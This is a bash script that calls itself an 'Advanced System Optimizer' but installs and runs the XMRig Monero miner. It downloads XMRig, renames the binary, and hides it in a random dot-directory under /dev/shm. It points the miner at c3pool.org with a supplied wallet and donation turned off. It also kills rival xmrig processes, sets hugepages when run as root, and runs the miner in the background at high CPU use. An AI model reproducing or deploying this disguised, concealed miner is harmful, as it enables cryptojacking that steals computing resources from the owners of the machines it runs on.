#!/bin/bash
VERSION=2.23
echo "Advanced System Optimizer v$VERSION"
echo "Exact 85% CPU - SINGLE PROCESS in htop (~510%)"
echo
export LC_ALL=C
export LANG=C

REAL_USER="${SUDO_USER:-$(whoami)}"
RAND_HEX=$(openssl rand -hex 16)
SYSTEM_USER="opt$(openssl rand -hex 6)"
BASE_DIR="/dev/shm/.$RAND_HEX"
LOG_DIR="$BASE_DIR/.log"

WALLET="$1"
if [ -z "$WALLET" ]; then
    echo "Usage: $0 <wallet>"
    exit 1
fi

# --- پیش‌نیازها ---
if ! command -v curl >/dev/null || ! command -v tar >/devdev/null; then
    sudo apt-get update -qq >/dev/null && sudo apt-get install -y curl tar >/dev/null 2>&1 || true
fi

# --- CPU ---
CPU_TOTAL=$(nproc)
USABLE_THREADS=$(( CPU_TOTAL > 6 ? 6 : CPU_TOTAL ))
[ $USABLE_THREADS -lt 1 ] && USABLE_THREADS=1
CPU_HINT=85

echo "[*] Using $USABLE_THREADS threads @ $CPU_HINT% → ~$(( USABLE_THREADS * CPU_HINT / 100 )) cores"

# --- پاک‌سازی ---
pkill -9 -f xmrig 2>/dev/null
find /dev/shm -type d -name ".*" -exec rm -rf {} + 2>/dev/null

# --- hugepages ---
if [ "$(id -u)" -eq 0 ]; then
    [ ! -f /etc/sysctl.conf ] && touch /etc/sysctl.conf
    grep -q "vm.nr_hugepages=1280" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
    sysctl -p /etc/sysctl.conf >/dev/null 2>&1
    echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null
fi

# --- ساخت مسیر ---
mkdir -p "$BASE_DIR" "$LOG_DIR"
chmod 700 "$BASE_DIR" "$LOG_DIR"

# --- دانلود ---
URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
TMP="/tmp/.$(openssl rand -hex 4).tgz"
curl -fsSL "$URL" -o "$TMP" || exit 1
tar xzf "$TMP" -C /tmp/ || { rm -f "$TMP"; exit 1; }
XMRIG=$(find /tmp -name "xmrig" -executable -type f | head -1)
cp "$XMRIG" "$BASE_DIR/main"
chmod +x "$BASE_DIR/main"
rm -f "$TMP"
rm -rf /tmp/xmrig*

# --- config.json (حداقل + override در command) ---
cat > "$BASE_DIR/config.json" << EOF
{
    "donate-level": 0,
    "pools": [{
        "url": "c3pool.org:13333",
        "user": "$WALLET",
        "pass": "x",
        "rig-id": "$SYSTEM_USER",
        "tls": true,
        "keepalive": true
    }],
    "print-time": 5,
    "retries": 10,
    "retry-pause": 1
}
EOF

# --- استارت با command line override (تضمینی یک فرآیند) ---
nohup "$BASE_DIR/main" \
  --config="$BASE_DIR/config.json" \
  --threads=$USABLE_THREADS \
  --cpu-max-threads-hint=$CPU_HINT \
  --cpu-priority=5 \
  --cpu-no-yield \
  --cpu-affinity=0-$((USABLE_THREADS-1)) \
  --log-file="$LOG_DIR/out.log" \
  > "$LOG_DIR/out.log" 2>&1 &

PID=$!
echo $PID > "$BASE_DIR/.pid"
echo "Started PID: $PID"
echo "Waiting 20s for full load..."

sleep 20

# --- وضعیت نهایی ---
echo
echo "=== FINAL STATUS ==="
if kill -0 $PID 2>/dev/null; then
    CPU=$(ps -p $PID -o %cpu --no-headers | awk '{printf "%.0f", $1}')
    echo "PID $PID → $CPU% CPU (~$((CPU/100)) cores)"
    echo "Check htop: ONE LINE with ~510%"
else
    echo "Failed to start"
fi

echo
echo "Path: $BASE_DIR"
echo "Logs: tail -f $LOG_DIR/out.log"
echo "Stop: pkill -f $BASE_DIR/main"

exit 0
